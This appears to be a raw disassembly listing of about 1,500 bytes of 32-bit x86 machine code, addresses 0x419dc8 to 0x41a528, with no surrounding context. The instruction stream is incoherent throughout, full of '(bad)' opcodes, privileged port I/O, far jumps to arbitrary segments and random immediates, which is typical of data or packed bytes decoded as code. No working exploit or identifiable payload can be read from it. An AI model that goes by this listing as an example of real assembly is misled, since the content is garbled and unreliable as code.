  419dc8:	les    ebx,FWORD PTR [edx-0x61]
  419dcb:	inc    ebx
  419dcc:	out    dx,eax
  419dcd:	outs   dx,DWORD PTR ds:[esi]
  419dce:	call   0x56d08280
  419dd3:	in     al,dx
  419dd4:	into   
  419dd5:	jg     0x419e12
  419dd7:	mov    ah,0xcf
  419dd9:	and    ch,BYTE PTR [ebx-0x20a422bf]
  419ddf:	(bad)  
  419de0:	sbb    edx,DWORD PTR [esi-0x2ea7f675]
  419de6:	aas    
  419de7:	inc    edi
  419de8:	aaa    
  419de9:	sub    DWORD PTR [ebp+0x60],edx
  419dec:	and    eax,0x1bd2802b
  419df1:	sbb    al,BYTE PTR [edi]
  419df3:	jbe    0x419e1d
  419df5:	mov    WORD PTR [edi],ss
  419df7:	repnz dec eax
  419df9:	mov    ecx,ss
  419dfb:	xchg   esi,eax
  419dfc:	mov    bl,0xc
  419dfe:	jge    0x419d9e
  419e00:	outs   dx,BYTE PTR ds:[esi]
  419e01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e02:	cmp    al,0x57
  419e04:	inc    ebx
  419e05:	sub    al,0xa9
  419e07:	dec    esi
  419e08:	outs   dx,DWORD PTR ds:[esi]
  419e09:	aas    
  419e0a:	sub    DWORD PTR [eax+0x52],esi
  419e0d:	mov    ah,0x16
  419e0f:	cmc    
  419e10:	mov    eax,ds:0x75167590
  419e15:	or     al,0x98
  419e17:	and    edx,DWORD PTR [esi-0x32]
  419e1a:	mov    eax,DWORD PTR fs:[esp+edx*1+0x1180576b]
  419e22:	ins    BYTE PTR es:[edi],dx
  419e23:	dec    esp
  419e24:	mov    ecx,0x87a5bc7
  419e29:	scas   al,BYTE PTR es:[edi]
  419e2a:	dec    esp
  419e2b:	push   edi
  419e2c:	les    ebx,FWORD PTR [ecx]
  419e2e:	push   ss
  419e2f:	cmp    ah,BYTE PTR [eax]
  419e31:	out    0x0,al
  419e33:	in     eax,0x0
  419e35:	rcr    BYTE PTR [eax+0xd],1
  419e38:	outs   dx,BYTE PTR ds:[esi]
  419e39:	mov    bl,0xd9
  419e3b:	dec    esp
  419e3c:	jae    0x419e72
  419e3e:	ins    DWORD PTR es:[edi],dx
  419e3f:	xchg   esp,eax
  419e40:	frstor [ecx+0xe]
  419e43:	sub    esi,ebx
  419e45:	add    al,BYTE PTR [edi+0x5a]
  419e48:	outs   dx,DWORD PTR ds:[esi]
  419e49:	dec    esi
  419e4a:	loop   0x419e26
  419e4c:	ja     0x419e8e
  419e4e:	and    eax,0x9510c36f
  419e53:	lock out 0x9d,al
  419e56:	into   
  419e57:	push   ebp
  419e58:	xchg   esi,eax
  419e59:	retf   0x2b79
  419e5c:	pop    ss
  419e5d:	sbb    eax,0xe46024bf
  419e62:	dec    edx
  419e63:	out    dx,eax
  419e64:	pop    ebx
  419e65:	adc    al,0x13
  419e67:	pop    ebx
  419e68:	dec    ebp
  419e69:	(bad)  
  419e6a:	enter  0xeadf,0xe5
  419e6e:	pop    esp
  419e6f:	and    al,0x75
  419e71:	push   0xeb20cb4
  419e76:	mov    dh,0xc
  419e78:	and    bh,ch
  419e7a:	jae    0x419e2d
  419e7c:	pushf  
  419e7d:	scas   eax,DWORD PTR es:[edi]
  419e7e:	mov    cl,BYTE PTR [esi]
  419e80:	jae    0x419e90
  419e82:	ret    
  419e83:	lods   eax,DWORD PTR ds:[esi]
  419e84:	pop    DWORD PTR [edx+0x2a6961c0]
  419e8a:	lods   eax,DWORD PTR ds:[esi]
  419e8b:	into   
  419e8c:	or     ch,al
  419e8e:	daa    
  419e8f:	and    bl,BYTE PTR [esi+0x7]
  419e92:	pop    edi
  419e93:	push   ss
  419e94:	dec    ebx
  419e95:	sub    eax,0x171ef465
  419e9a:	ds xchg ebp,eax
  419e9c:	sahf   
  419e9d:	xor    BYTE PTR [edx+0x53],dh
  419ea0:	or     BYTE PTR [edi+0x7f],bh
  419ea3:	nop
  419ea4:	jns    0x419ea8
  419ea6:	js     0x419efd
  419ea8:	xor    BYTE PTR [edi],0x97
  419eab:	iret   
  419eac:	sub    ah,BYTE PTR [edi]
  419eae:	into   
  419eaf:	fadd   QWORD PTR [ebp+ecx*1-0x69]
  419eb3:	and    eax,0x7631768f
  419eb8:	inc    ecx
  419eb9:	cmp    eax,0x9f9b0ceb
  419ebe:	adc    eax,0x979d5ebf
  419ec3:	push   ebx
  419ec4:	sub    BYTE PTR [esi+0x62b65e1b],al
  419eca:	jmp    0xb6c8:0xe947f3f5
  419ed1:	je     0x419e92
  419ed3:	outs   dx,DWORD PTR ds:[esi]
  419ed4:	mov    ebx,0x8cbf043e
  419ed9:	adc    al,0x44
  419edb:	jecxz  0x419f24
  419edd:	sti    
  419ede:	jae    0x419e98
  419ee0:	push   ebp
  419ee1:	test   al,0x9a
  419ee3:	push   ss
  419ee4:	push   0xb56ba850
  419ee9:	neg    al
  419eeb:	inc    edx
  419eec:	mov    eax,ds:0xcc0c1658
  419ef1:	xor    al,0xd7
  419ef3:	sbb    dl,BYTE PTR [ebx+0xc]
  419ef6:	loopne 0x419f47
  419ef8:	inc    ebp
  419ef9:	add    eax,0x9fb8e935
  419efe:	repz leave 
  419f00:	jecxz  0x419f67
  419f02:	push   edi
  419f03:	push   esp
  419f04:	mov    esi,DWORD PTR [ebp-0x30]
  419f07:	add    eax,DWORD PTR [ebp-0x7ec46c34]
  419f0d:	pop    ebp
  419f0e:	jge    0x419ec0
  419f10:	mov    ds:0xe62f5edf,al
  419f15:	in     eax,dx
  419f16:	dec    eax
  419f17:	call   0x3561:0x88217ad
  419f1e:	push   es
  419f1f:	mov    WORD PTR [esi+0x2b7d8e2f],?
  419f25:	cmp    esi,ebp
  419f27:	cld    
  419f28:	ins    DWORD PTR es:[edi],dx
  419f29:	mov    fs,WORD PTR [edx+0x64428f4d]
  419f2f:	pop    es
  419f30:	jecxz  0x419f08
  419f32:	pop    ebx
  419f33:	fdivr  QWORD PTR [edi-0x7680b72a]
  419f39:	or     eax,0x2855d4c2
  419f3e:	rcr    BYTE PTR [eax-0x44838e5f],1
  419f44:	mul    BYTE PTR [edx+0x76]
  419f47:	jmp    0x1c95f2c0
  419f4c:	cli    
  419f4d:	add    dl,BYTE PTR [edx-0x5bc81598]
  419f53:	mov    ah,ah
  419f55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f56:	pusha  
  419f57:	pop    eax
  419f58:	(bad)  
  419f59:	pop    ebp
  419f5a:	pop    esp
  419f5b:	in     eax,0x49
  419f5d:	icebp  
  419f5e:	(bad)  
  419f5f:	(bad)  
  419f60:	int3   
  419f61:	cmp    ch,BYTE PTR [edi-0x51b31303]
  419f67:	addr16 cmp eax,0x14
  419f6b:	ins    BYTE PTR es:[edi],dx
  419f6c:	push   cs
  419f6d:	xchg   edi,eax
  419f6e:	push   ebp
  419f6f:	pop    ebp
  419f70:	imul   esp,DWORD PTR [esi],0xd72dd1b7
  419f76:	mov    DWORD PTR [esi+0x57e93921],esp
  419f7c:	mov    ds:0x43a465c0,al
  419f81:	or     DWORD PTR [eax-0x2956a3d0],eax
  419f87:	jo     0x419fe2
  419f89:	cli    
  419f8a:	or     edi,esi
  419f8c:	jmp    0xa4df:0x6851eac
  419f93:	dec    ebp
  419f94:	pop    ecx
  419f95:	popa   
  419f96:	add    ecx,DWORD PTR [edi+edi*4]
  419f99:	aam    0xc9
  419f9b:	xor    bl,bl
  419f9d:	sar    BYTE PTR [ebp-0x234be0b9],1
  419fa3:	mov    ch,0xb1
  419fa5:	jle    0x419ff4
  419fa7:	outs   dx,BYTE PTR ds:[esi]
  419fa8:	xor    edi,DWORD PTR [ebp-0x4ea9eabb]
  419fae:	jecxz  0x419f6b
  419fb0:	jmp    0x599159cc
  419fb5:	stos   DWORD PTR es:[edi],eax
  419fb6:	test   BYTE PTR [eax],ch
  419fb8:	pop    es
  419fb9:	lahf   
  419fba:	in     al,0x65
  419fbc:	push   edx
  419fbd:	push   ecx
  419fbe:	not    ebp
  419fc0:	mov    WORD PTR [ebx+0x15e1c95d],ss
  419fc6:	leave  
  419fc7:	sbb    bh,BYTE PTR [ebp-0x6d9ef5a6]
  419fcd:	(bad)  
  419fce:	loop   0x419ffa
  419fd0:	out    0x2f,al
  419fd2:	fucom  st(5)
  419fd4:	imul   edi,DWORD PTR ds:[ecx],0x3cff1218
  419fdb:	fidivr DWORD PTR [ebx-0x47]
  419fde:	mov    ds:0x4d7942e8,al
  419fe3:	sbb    edx,DWORD PTR gs:[edi]
  419fe6:	(bad)  
  419fe7:	call   0x4006:0xbeb1b4b
  419fee:	popa   
  419fef:	lods   al,BYTE PTR ds:[esi]
  419ff0:	bsr    ecx,eax
  419ff3:	arpl   WORD PTR [edx-0x3cfd488b],bx
  419ff9:	jae    0x41a064
  419ffb:	jg     0x419fa3
  419ffd:	test   DWORD PTR [edi+eax*8+0x17b4d7d2],edi
  41a004:	xchg   esp,eax
  41a005:	aaa    
  41a006:	scas   al,BYTE PTR es:[edi]
  41a007:	stc    
  41a008:	adc    DWORD PTR ds:0xd36da7fa,edi
  41a00e:	ficomp WORD PTR [ebx-0x62]
  41a011:	int    0x72
  41a013:	push   edx
  41a014:	jns    0x41a036
  41a016:	xchg   ebp,eax
  41a017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a018:	xor    BYTE PTR [ebp-0x6a],ah
  41a01b:	adc    al,0x98
  41a01d:	xor    ch,BYTE PTR [eax+0x28]
  41a020:	dec    esi
  41a021:	neg    BYTE PTR [esi]
  41a023:	inc    edx
  41a024:	and    DWORD PTR [ebx],esp
  41a026:	ret    
  41a027:	inc    edi
  41a028:	test   esi,0x49f56633
  41a02e:	cmp    bh,dh
  41a030:	xchg   DWORD PTR [esi+edx*1+0x64],edx
  41a034:	and    al,0xa0
  41a036:	(bad)  
  41a037:	and    ch,BYTE PTR [eax-0x4efabf74]
  41a03d:	cmp    DWORD PTR [edi+ecx*4],edx
  41a040:	ret    0x2e5
  41a043:	push   edi
  41a044:	push   ds
  41a045:	inc    BYTE PTR [ecx+0x3c6b954e]
  41a04b:	(bad)  
  41a04c:	cdq    
  41a04d:	add    DWORD PTR [esi-0x49569030],eax
  41a053:	mov    WORD PTR [eax-0x260def87],ss
  41a059:	out    0x3,eax
  41a05b:	mov    ebp,0x71dedf26
  41a060:	xlat   BYTE PTR ds:[ebx]
  41a061:	fs mov BYTE PTR gs:[esi],ch
  41a065:	call   0x5dd6:0x6f3f290c
  41a06c:	mov    esi,0xfad98ca3
  41a071:	shl    BYTE PTR [edx-0x2f06e939],1
  41a077:	sbb    DWORD PTR [ecx],esp
  41a079:	ror    BYTE PTR [ecx-0x30],1
  41a07c:	xchg   ecx,eax
  41a07d:	inc    ecx
  41a07e:	inc    esi
  41a07f:	fwait
  41a080:	jecxz  0x41a084
  41a082:	mov    ecx,0x338ab70b
  41a087:	dec    eax
  41a088:	dec    esp
  41a089:	fimul  DWORD PTR [edi-0x4812ed3b]
  41a08f:	lods   al,BYTE PTR ds:[esi]
  41a090:	js     0x41a0ae
  41a092:	mov    ebp,0xd7491e0b
  41a097:	or     al,0x48
  41a09a:	push   esp
  41a09b:	jl     0x41a05a
  41a09d:	and    BYTE PTR [eax-0x2b9384f2],dh
  41a0a3:	push   esi
  41a0a4:	mov    dh,BYTE PTR ds:0x146175ac
  41a0aa:	imul   BYTE PTR [edx+0x3e]
  41a0ad:	(bad)  
  41a0ae:	mov    edx,esi
  41a0b0:	cld    
  41a0b1:	and    esp,DWORD PTR [edx]
  41a0b3:	xor    al,0xcf
  41a0b5:	and    BYTE PTR [eax+0x6e],cl
  41a0b8:	ret    0xb883
  41a0bb:	sti    
  41a0bc:	outs   dx,BYTE PTR ds:[esi]
  41a0bd:	xor    DWORD PTR [edi-0x52],esi
  41a0c0:	xor    BYTE PTR [edx+0x22],cl
  41a0c3:	daa    
  41a0c4:	dec    edi
  41a0c5:	ret    0x4327
  41a0c8:	jg     0x41a0a2
  41a0ca:	daa    
  41a0cb:	inc    eax
  41a0cc:	out    0x74,al
  41a0ce:	int3   
  41a0cf:	call   0x1d921c5e
  41a0d4:	and    BYTE PTR [ebx],ch
  41a0d6:	into   
  41a0d7:	mov    WORD PTR [edi-0x37],ds
  41a0da:	jmp    0x41a070
  41a0dc:	mov    bl,0xdf
  41a0de:	dec    DWORD PTR [esi-0x1e701869]
  41a0e4:	add    eax,0x764148c9
  41a0e9:	and    al,0xcf
  41a0eb:	push   ds
  41a0ec:	loopne 0x41a118
  41a0ee:	adc    eax,0x260427b0
  41a0f3:	loope  0x41a0b9
  41a0f5:	jmp    0x41a0b3
  41a0f7:	lahf   
  41a0f8:	repnz mov al,0x9c
  41a0fb:	mov    dl,0x91
  41a0fd:	imul   edx,DWORD PTR [edi+0x0],0xab9ca0b1
  41a104:	addr16 not dl
  41a107:	addr16 add ah,cl
  41a10a:	mov    bl,0xd7
  41a10c:	adc    BYTE PTR [edi+0x49],dh
  41a10f:	mov    dl,0x83
  41a111:	fmul   DWORD PTR [edx+0x71]
  41a114:	out    dx,eax
  41a115:	inc    ebx
  41a116:	and    eax,ebx
  41a118:	push   0x5e6b695d
  41a11d:	jno    0x41a13b
  41a11f:	adc    eax,0xcf6c3b79
  41a124:	inc    esi
  41a125:	stos   BYTE PTR es:[edi],al
  41a126:	je     0x41a174
  41a128:	inc    DWORD PTR [esi-0x2eacce04]
  41a12e:	adc    eax,0xe24d1987
  41a133:	aad    0xc
  41a135:	add    eax,0xaa7747a1
  41a13a:	cld    
  41a13b:	loopne 0x41a0fd
  41a13d:	dec    edi
  41a13e:	xchg   esi,eax
  41a13f:	aad    0xbb
  41a141:	(bad)  
  41a142:	hlt    
  41a143:	dec    edi
  41a144:	jbe    0x41a0cb
  41a146:	xchg   esp,eax
  41a147:	mov    eax,0x3ea28582
  41a14c:	add    al,BYTE PTR [edx+ebp*4+0x4dd7b538]
  41a153:	cs mov bl,0x61
  41a156:	mov    ebx,0x5b5fcb90
  41a15b:	or     esi,eax
  41a15d:	adc    esi,ebp
  41a15f:	fs fs leave 
  41a162:	mov    ds:0x1fd788cb,eax
  41a167:	(bad)  
  41a168:	jb     0x41a156
  41a16a:	mov    BYTE PTR [ecx+0x71],bh
  41a16d:	(bad)  
  41a16e:	mov    bh,0xba
  41a170:	imul   esi,DWORD PTR [eax],0x5bf9c66e
  41a176:	and    eax,ebx
  41a178:	pop    DWORD PTR [eax]
  41a17a:	out    0xe5,al
  41a17c:	cmp    DWORD PTR ds:0x9ba62486,ecx
  41a182:	pop    ebp
  41a183:	scas   eax,DWORD PTR es:[edi]
  41a184:	mov    ebx,DWORD PTR [ecx-0x70]
  41a187:	xor    bl,dh
  41a189:	jb     0x41a160
  41a18b:	and    dl,ah
  41a18d:	(bad)
  41a190:	mov    cs,WORD PTR [ebx+0x58]
  41a193:	es es scas al,BYTE PTR es:[edi]
  41a196:	add    DWORD PTR [ebx-0x6e],esi
  41a199:	mov    eax,0xaa7ace06
  41a19e:	or     BYTE PTR [ebp+0x6802fd63],bh
  41a1a4:	leave  
  41a1a5:	ficom  DWORD PTR [edi+0x25]
  41a1a8:	bound  esp,QWORD PTR [eax*1-0x47b7e4bd]
  41a1af:	mov    BYTE PTR [esi+0x6a],dl
  41a1b2:	in     eax,dx
  41a1b3:	pop    ebp
  41a1b4:	enter  0xc393,0xd5
  41a1b8:	fdivr  st(4),st
  41a1ba:	jp     0x41a228
  41a1bc:	(bad)  
  41a1bd:	int    0x33
  41a1bf:	pop    edi
  41a1c0:	jnp    0x41a19d
  41a1c2:	fstp   QWORD PTR [esi]
  41a1c4:	stc    
  41a1c5:	icebp  
  41a1c6:	xor    bh,BYTE PTR [ecx-0x6e]
  41a1c9:	(bad)  
  41a1ca:	dec    eax
  41a1cb:	xchg   edx,eax
  41a1cc:	mov    ebx,0x76916254
  41a1d1:	inc    esi
  41a1d2:	ds cmp al,0x2f
  41a1d5:	call   0x86b0:0x679609fc
  41a1dc:	mov    dl,0xdd
  41a1de:	push   cs
  41a1df:	mov    ecx,0x7d4da2e5
  41a1e4:	or     DWORD PTR [ebp+0x74],0x6178e294
  41a1eb:	inc    ebx
  41a1ec:	ret    
  41a1ed:	push   ss
  41a1ee:	mov    cl,0x34
  41a1f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1f1:	ret    0x56c5
  41a1f4:	mov    ebp,0x4cd1cabc
  41a1f9:	je     0x41a1eb
  41a1fb:	inc    ebp
  41a1fc:	push   0x42
  41a1fe:	add    DWORD PTR [ecx-0x40],0xcecb185d
  41a205:	ficomp WORD PTR [ecx-0x4f]
  41a208:	and    edi,ecx
  41a20a:	(bad)  
  41a20c:	pop    ebx
  41a20d:	mov    ebx,0x6a4e60e1
  41a212:	sbb    DWORD PTR [ecx],esp
  41a214:	test   BYTE PTR [ecx+0x20],ch
  41a217:	or     al,0x1c
  41a219:	imul   ebp,DWORD PTR [edx+esi*2],0x5e1eec05
  41a220:	loope  0x41a1e4
  41a222:	pop    ecx
  41a223:	xor    ah,dh
  41a225:	fsubr  QWORD PTR [edi-0x951b598]
  41a22b:	gs add ebp,edx
  41a22e:	int    0xca
  41a230:	mov    ecx,0xec537b5c
  41a235:	mov    edi,edi
  41a237:	clc    
  41a238:	push   ebp
  41a239:	iret   
  41a23a:	push   es
  41a23b:	inc    ebp
  41a23c:	mov    edi,0x32f4a2b3
  41a241:	push   ss
  41a242:	popf   
  41a243:	stos   BYTE PTR es:[edi],al
  41a244:	pop    es
  41a245:	call   0xeaf6:0x15d5f9da
  41a24c:	cmp    DWORD PTR gs:[ecx],esi
  41a24f:	jae    0x41a26c
  41a251:	mov    bl,0xa3
  41a253:	mov    ?,WORD PTR [ebp+0x1e]
  41a256:	lods   eax,DWORD PTR ds:[esi]
  41a257:	cmp    BYTE PTR [edx],dh
  41a259:	arpl   WORD PTR [ecx-0x2b],bx
  41a25c:	jno    0x41a250
  41a25e:	pop    ds
  41a25f:	imul   ebp,ecx,0xf32c8123
  41a265:	lahf   
  41a266:	in     al,dx
  41a267:	test   al,0x3b
  41a269:	pusha  
  41a26a:	push   esi
  41a26b:	xchg   ebp,eax
  41a26c:	or     eax,0xe819b14c
  41a271:	sbb    eax,0xa2687b0f
  41a276:	imul   ebx,edx,0x3195ea08
  41a27c:	stc    
  41a27d:	int3   
  41a27e:	cmp    al,0x53
  41a280:	cmp    al,0xf0
  41a282:	mov    ch,0x48
  41a284:	rcl    BYTE PTR [eax],0x54
  41a287:	jmp    0x95c6:0xe3f2365
  41a28e:	fwait
  41a28f:	pop    ecx
  41a290:	push   eax
  41a291:	mov    ss,WORD PTR [esi+edx*8+0x72]
  41a295:	and    ecx,DWORD PTR [ecx+0x33]
  41a298:	jno    0x41a311
  41a29a:	xlat   BYTE PTR ds:[ebx]
  41a29b:	inc    eax
  41a29c:	daa    
  41a29d:	push   esi
  41a29e:	push   esp
  41a29f:	xchg   ebx,eax
  41a2a0:	add    DWORD PTR [ecx-0x9],ebp
  41a2a3:	cmp    eax,0xc3f57bef
  41a2a8:	and    eax,0xe660061d
  41a2ad:	out    dx,al
  41a2ae:	adc    edi,DWORD PTR [edx-0xc]
  41a2b1:	int3   
  41a2b2:	inc    ebp
  41a2b3:	repnz out 0x66,eax
  41a2b6:	add    dh,cl
  41a2b8:	xchg   edi,eax
  41a2b9:	mov    ds:0x6bf5400c,eax
  41a2be:	test   eax,0xb3f2c28f
  41a2c3:	rcl    BYTE PTR [ebx],1
  41a2c5:	add    cl,BYTE PTR [edi-0x74]
  41a2c8:	in     al,dx
  41a2c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2ca:	fwait
  41a2cb:	push   es
  41a2cc:	nop
  41a2cd:	xchg   edx,eax
  41a2ce:	inc    ebx
  41a2cf:	push   esi
  41a2d0:	dec    esi
  41a2d1:	or     BYTE PTR [edx-0x4a],bh
  41a2d4:	mov    al,0x5f
  41a2d6:	add    dh,BYTE PTR [ebx+0x3a60d790]
  41a2dc:	pop    edx
  41a2dd:	mov    WORD PTR [esi],es
  41a2df:	pusha  
  41a2e0:	cli    
  41a2e1:	ret    0x60ed
  41a2e4:	out    dx,al
  41a2e5:	sti    
  41a2e6:	aaa    
  41a2e7:	or     DWORD PTR [eax],ebp
  41a2e9:	in     eax,dx
  41a2ea:	jbe    0x41a306
  41a2ec:	pop    edx
  41a2ed:	out    dx,eax
  41a2ee:	add    ch,BYTE PTR [ebx-0xee1d2c2]
  41a2f4:	mov    al,0x1b
  41a2f6:	pop    edi
  41a2f7:	outs   dx,BYTE PTR ds:[esi]
  41a2f8:	push   edi
  41a2f9:	jo     0x41a335
  41a2fb:	push   ss
  41a2fc:	into   
  41a2fd:	js     0x41a33c
  41a2ff:	outs   dx,BYTE PTR ds:[esi]
  41a300:	rcl    DWORD PTR [esi],cl
  41a302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a303:	lods   eax,DWORD PTR ds:[esi]
  41a304:	or     al,0xbb
  41a306:	mov    eax,fs
  41a308:	rcr    BYTE PTR [eax-0xcdc9889],1
  41a30e:	mov    edx,0xb4bf9c4e
  41a313:	mov    fs,WORD PTR [edx]
  41a315:	fwait
  41a316:	fwait
  41a317:	cmp    DWORD PTR [ebx+0x32],0x870c9ae6
  41a31e:	ss sub al,0xb1
  41a321:	inc    esp
  41a322:	aaa    
  41a323:	and    bl,cl
  41a325:	push   es
  41a326:	dec    ecx
  41a327:	inc    ecx
  41a328:	add    bh,BYTE PTR ds:0xad56c005
  41a32e:	mov    bl,0xc6
  41a330:	in     eax,dx
  41a331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a332:	repz sub al,0x16
  41a335:	xchg   ebx,eax
  41a336:	imul   edx,DWORD PTR [eax-0x4202280f],0xffffffe5
  41a33d:	or     BYTE PTR [ecx+0x59],al
  41a340:	sub    ebp,DWORD PTR [ecx]
  41a342:	mov    al,ds:0x46179471
  41a347:	lock or dl,ch
  41a34a:	xchg   edx,eax
  41a34b:	call   0xc08a346e
  41a350:	ja     0x41a33b
  41a352:	dec    edi
  41a353:	or     esi,eax
  41a355:	stc    
  41a356:	aam    0xd6
  41a358:	dec    ecx
  41a359:	jge    0x41a3d7
  41a35b:	push   ebp
  41a35c:	xor    eax,0x568171fc
  41a361:	addr16 inc eax
  41a363:	js     0x41a37c
  41a365:	pop    es
  41a366:	pop    edi
  41a367:	dec    ebx
  41a368:	lahf   
  41a369:	or     BYTE PTR [edi+0x13c89737],cl
  41a36f:	add    al,0x4e
  41a371:	add    eax,DWORD PTR [esi-0xe8ddc02]
  41a377:	icebp  
  41a378:	push   cs
  41a379:	sub    eax,0x5fdb40b1
  41a37e:	push   ebx
  41a37f:	adc    BYTE PTR [ebx+eiz*2+0x2d],ch
  41a383:	fcom   QWORD PTR [ebx]
  41a385:	push   cs
  41a386:	js     0x41a364
  41a388:	iret   
  41a389:	retf   0x5945
  41a38c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a38d:	fild   QWORD PTR [edx]
  41a38f:	dec    esi
  41a390:	mov    DWORD PTR [ecx],esp
  41a392:	hlt    
  41a393:	sub    al,0x17
  41a395:	mov    al,0xdf
  41a397:	mov    esi,0xb3374ded
  41a39c:	js     0x41a37a
  41a39e:	sbb    eax,DWORD PTR [esi-0x2b]
  41a3a1:	sub    dl,dl
  41a3a3:	fdivr  DWORD PTR [ebp+0x67]
  41a3a6:	mov    dh,0x1e
  41a3a8:	xchg   BYTE PTR [edi-0x16650f10],cl
  41a3ae:	or     bl,BYTE PTR [ecx]
  41a3b0:	fdiv   DWORD PTR [edi+0x31]
  41a3b3:	cmp    BYTE PTR [edi],cl
  41a3b5:	jl     0x41a3d2
  41a3b7:	(bad)  
  41a3b8:	and    al,0xc9
  41a3ba:	cmp    edx,DWORD PTR [ebp-0x3]
  41a3bd:	(bad)  
  41a3be:	mov    eax,0xc7f6c6b1
  41a3c3:	mov    bh,dl
  41a3c5:	out    dx,al
  41a3c6:	dec    esi
  41a3c7:	sti    
  41a3c8:	jns    0x41a448
  41a3ca:	cmc    
  41a3cb:	or     BYTE PTR [ebp-0x7c],0x34
  41a3cf:	inc    edx
  41a3d0:	mov    dh,0x56
  41a3d2:	imul   DWORD PTR [ecx+0x88a34c6]
  41a3d8:	xchg   esi,eax
  41a3d9:	wrmsr  
  41a3db:	(bad)  
  41a3dc:	cdq    
  41a3dd:	inc    ebx
  41a3de:	dec    ebx
  41a3df:	aad    0xa4
  41a3e1:	data16 add BYTE PTR [edi],ch
  41a3e4:	xchg   edx,eax
  41a3e5:	xchg   BYTE PTR [edi],dl
  41a3e7:	inc    edi
  41a3e8:	out    dx,eax
  41a3e9:	call   0x14cd2b82
  41a3ee:	sbb    al,0x3b
  41a3f0:	sbb    BYTE PTR [edx+0x75f564d4],0x4e
  41a3f7:	jecxz  0x41a446
  41a3f9:	ins    DWORD PTR es:[edi],dx
  41a3fa:	daa    
  41a3fb:	(bad)  
  41a3fc:	loopne 0x41a3c2
  41a3fe:	adc    ah,0x20
  41a401:	enter  0x6b31,0x4c
  41a405:	aas    
  41a406:	sbb    al,cl
  41a408:	cmp    bh,cl
  41a40a:	(bad)  
  41a40b:	fstp   QWORD PTR [ecx]
  41a40d:	iret   
  41a40e:	xchg   edi,eax
  41a40f:	jne    0x41a3c8
  41a411:	mov    ebp,DWORD PTR [ebp-0x68d8616e]
  41a417:	pop    ss
  41a418:	mov    bh,bl
  41a41a:	jmp    0x41a479
  41a41c:	jne    0xd09078cc
  41a422:	test   eax,0x8bde4dc1
  41a427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a428:	sbb    eax,0x566fdd63
  41a42d:	xor    al,0xa1
  41a42f:	push   eax
  41a430:	data16 sbb al,0xba
  41a433:	sahf   
  41a434:	nop
  41a435:	test   DWORD PTR [edx],0x25324b32
  41a43b:	fnstcw WORD PTR [ecx]
  41a43d:	jne    0x41a3bf
  41a43f:	push   edi
  41a440:	adc    BYTE PTR [esi],al
  41a442:	ss xor esi,ebp
  41a445:	fsubr  DWORD PTR [ebx]
  41a447:	ffree  st(2)
  41a449:	dec    ebp
  41a44a:	mov    WORD PTR [ebx-0x320f7f12],es
  41a450:	test   DWORD PTR [edi+ecx*1+0x17350c3c],edx
  41a457:	xchg   esi,eax
  41a458:	rol    DWORD PTR [ebx+0x38],cl
  41a45b:	enter  0x709d,0xc8
  41a45f:	pop    edx
  41a460:	inc    edx
  41a461:	ficom  DWORD PTR [ecx+0x74]
  41a464:	xchg   edx,ebx
  41a466:	and    DWORD PTR [edi*4-0x2966a561],edi
  41a46d:	cmp    BYTE PTR [eax-0x67b28939],ah
  41a473:	sbb    dh,BYTE PTR [edi]
  41a475:	cmp    BYTE PTR [esi-0x54e214f8],dh
  41a47b:	adc    DWORD PTR ss:[ebp+edx*1+0x19],esi
  41a480:	je     0x41a4f4
  41a482:	mov    bh,0xe6
  41a484:	push   0xffffffe1
  41a486:	daa    
  41a487:	dec    esp
  41a488:	cmp    dh,bl
  41a48a:	jmp    0x41a4a4
  41a48c:	retf   
  41a48d:	and    ecx,ecx
  41a48f:	mov    eax,ds:0xd9b26d74
  41a494:	aad    0xdb
  41a496:	(bad)  
  41a497:	jb     0x41a420
  41a499:	cdq    
  41a49a:	jns    0x41a482
  41a49c:	pop    eax
  41a49d:	pop    edx
  41a49e:	mov    ?,WORD PTR [ebx]
  41a4a0:	push   ecx
  41a4a1:	mov    bl,0xb1
  41a4a3:	loopne 0x41a505
  41a4a5:	call   0x8491:0x2f596ae2
  41a4ac:	out    0x57,eax
  41a4ae:	imul   edi,DWORD PTR [ebp+ebp*4+0x6b749523],0x29
  41a4b6:	fnstcw WORD PTR [esi]
  41a4b8:	xchg   edx,eax
  41a4b9:	into   
  41a4ba:	(bad)  
  41a4bb:	push   esp
  41a4bc:	mov    edi,0x21227058
  41a4c1:	xor    ebp,ecx
  41a4c3:	rcl    BYTE PTR [esi-0x1a],1
  41a4c6:	out    0xb4,al
  41a4c8:	cwde   
  41a4c9:	jle    0x41a502
  41a4cb:	add    DWORD PTR [edx],ebx
  41a4cd:	hlt    
  41a4ce:	pop    ecx
  41a4cf:	mov    WORD PTR [ebx-0x80],ss
  41a4d2:	add    BYTE PTR [edx],dl
  41a4d4:	das    
  41a4d5:	add    eax,0x9cf6e927
  41a4da:	sub    edi,esp
  41a4dc:	sbb    al,0xfb
  41a4de:	push   edi
  41a4df:	rcr    BYTE PTR [eax-0x396347ed],0xad
  41a4e6:	push   edx
  41a4e7:	and    eax,0x2f776bc8
  41a4ec:	push   ecx
  41a4ed:	xchg   edi,eax
  41a4ee:	adc    eax,0xb1228a8b
  41a4f3:	or     DWORD PTR [ecx-0x44],edx
  41a4f6:	or     BYTE PTR [ebx],dl
  41a4f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4f9:	test   al,0x41
  41a4fb:	jne    0x41a532
  41a4fd:	push   ebx
  41a4fe:	mov    edx,0xea320d56
  41a503:	scas   al,BYTE PTR es:[edi]
  41a504:	imul   esi,DWORD PTR [ecx+0x39],0xafa7d1b
  41a50b:	xchg   ecx,eax
  41a50c:	rcl    DWORD PTR [ebx+0x59],1
  41a50f:	lock retf 
  41a511:	push   ss
  41a512:	xor    ch,BYTE PTR [ecx-0xea5ffc]
  41a518:	mov    bh,0xb9
  41a51a:	add    ebx,edx
  41a51c:	fsub   DWORD PTR [edx]
  41a51e:	in     al,dx
  41a51f:	and    ebp,edi
  41a521:	adc    al,0x9e
  41a523:	pop    eax
  41a525:	stos   DWORD PTR es:[edi],eax
  41a526:	aaa    
  41a527:	aas    
  41a528:	xchg   ecx,eax
